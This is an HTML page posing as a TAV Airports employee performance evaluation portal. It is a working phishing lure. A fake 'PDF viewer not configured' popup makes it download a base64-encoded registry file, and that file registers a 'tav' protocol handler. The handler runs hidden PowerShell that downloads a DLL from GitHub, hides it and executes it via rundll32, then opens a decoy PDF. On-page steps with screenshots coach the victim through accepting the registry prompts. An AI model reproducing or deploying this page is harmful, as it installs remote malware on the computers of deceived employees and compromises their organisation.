<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Employee Performance Summary</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: #333;
    }

    .container {
      max-width: 900px;
      margin: 60px auto;
      background-color: #ffffff;
      padding: 40px 30px;
      border-radius: 15px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
    }

    h1 {
      font-size: 26px;
      margin-bottom: 10px;
      color: #1e3c72;
      text-align: center;
    }

    .download-button {
      display: block;
      width: fit-content;
      margin: 0 auto 15px;
      background: linear-gradient(90deg, #4facfe, #00f2fe);
      color: #fff;
      text-decoration: none;
      font-weight: bold;
      padding: 14px 28px;
      border-radius: 8px;
      font-size: 16px;
      transition: background 0.3s ease, transform 0.2s;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .download-button:hover {
      background: linear-gradient(90deg, #00f2fe, #4facfe);
      transform: translateY(-2px);
    }

    .steps {
      display: none;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin-top: 30px;
    }

    .step {
      flex: 0 0 calc(50% - 20px);
      text-align: center;
    }

    .step img {
      width: 100%;
      max-width: 100%;
      border-radius: 10px;
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
    }

    .step-title {
      font-weight: bold;
      font-size: 17px;
      margin: 10px 0 12px;
      color: #1e3c72;
    }

    .logo-bar {
      margin-top: 40px;
      display: flex;
      justify-content: center;
      gap: 15px;
      flex-wrap: wrap;
    }

    .logo-bar img {
      height: 50px;
      background-color: rgba(255, 255, 255, 0.8);
      padding: 8px;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      transition: transform 0.3s ease;
    }

    .logo-bar img:hover { transform: scale(1.05); }

    @media (max-width: 700px) {
      .step { flex: 0 0 100%; }
    }

    /* Modal styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.6);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background-color: #fff;
      padding: 25px;
      border-radius: 10px;
      text-align: center;
      max-width: 480px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
    }

    .modal-content p {
      font-size: 16px;
      color: #c0392b;
      margin-bottom: 20px;
    }

    .modal-content button {
      background: linear-gradient(90deg, #4facfe, #00f2fe);
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 15px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }

    .modal-content button:hover {
      background: linear-gradient(90deg, #00f2fe, #4facfe);
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Employee Performance Summary</h1>

  <a id="view-button" class="download-button" href="tav://abc" onclick="openModal(); return false;">
    View Performance Evaluation Result
  </a>

  <div class="steps" id="steps-section">
    <div class="step">
      <div class="step-title">Step 1: Run File.</div>
      <img src="https://raw.githubusercontent.com/tavaero/TAV-PMS/refs/heads/main/image.png" alt="Step 1 Screenshot">
    </div>
    <div class="step">
      <div class="step-title">Step 2: Click yes on this page.</div>
      <img src="https://raw.githubusercontent.com/tavaero/TAV-PMS/refs/heads/main/Ekran%20g%C3%B6r%C3%BCnt%C3%BCs%C3%BC%202025-06-13%20145121.png" alt="Step 2 Screenshot">
    </div>
    <div class="step">
      <div class="step-title">Step 3: Accept the registry editor confirmation</div>
      <img src="https://raw.githubusercontent.com/tavaero/TAV-PMS/refs/heads/main/Ekran%20g%C3%B6r%C3%BCnt%C3%BCs%C3%BC%202025-06-13%20145132.png" alt="Step 3 Screenshot">
    </div>
    <div class="step">
      <div class="step-title">Step 4: Return to this page and click the button again</div>
      <img src="https://raw.githubusercontent.com/tavaero/TAV-PMS/refs/heads/main/Ekran%20g%C3%B6r%C3%BCnt%C3%BCs%C3%BC%202025-06-13%20145208.png" alt="Step 4 Screenshot">
    </div>
  </div>

  <div class="logo-bar">
    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
    <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU Logo"/>
    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS Logo"/>
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo"/>
  </div>
</div>

<!-- Modal -->
<div id="popupModal" class="modal">
  <div class="modal-content">
    <p><strong>Your PDF viewer is not properly configured.</strong><br>Click OK and follow the instructions below.</p>
    <button onclick="closeModalAndProceed()">OK</button>
  </div>
</div>

<script>
  function openModal() {
    document.getElementById('popupModal').style.display = 'flex';
  }

  function closeModalAndProceed() {
    document.getElementById('popupModal').style.display = 'none';
    showSteps();
    downloadRegFile();
  }

  function showSteps() {
    document.getElementById('steps-section').style.display = 'flex';
  }

  function b64ToArrayBuffer(base64) {
    const cleaned = base64.replace(/^data:.*;base64,/, '');
    const binaryString = window.atob(cleaned);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes.buffer;
  }

  function downloadRegFile() {
    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo=';
    const arrayBuffer = b64ToArrayBuffer(base64);
    const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
    const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    URL.revokeObjectURL(a.href);
    a.remove();
  }
</script>

</body>
</html>
